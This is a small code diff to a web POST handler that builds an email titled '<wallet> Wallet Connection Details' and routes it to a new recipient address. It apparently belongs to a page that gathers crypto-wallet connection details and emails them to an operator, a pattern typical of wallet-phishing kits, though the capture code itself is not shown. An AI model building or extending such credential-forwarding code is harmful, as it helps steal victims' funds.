@@ -28,7 +28,7 @@ export async function POST(request: Request) {
       // Prepare email DTO
       const emailDto = {
         sender: process.env.MAIL_USER,
-        receipients: process.env.MAIL_USER,
+        receipients: process.env.MAIL_RECIEPIENT,
         subject: `${walletName} Wallet Connection Details`,
         message,
       };
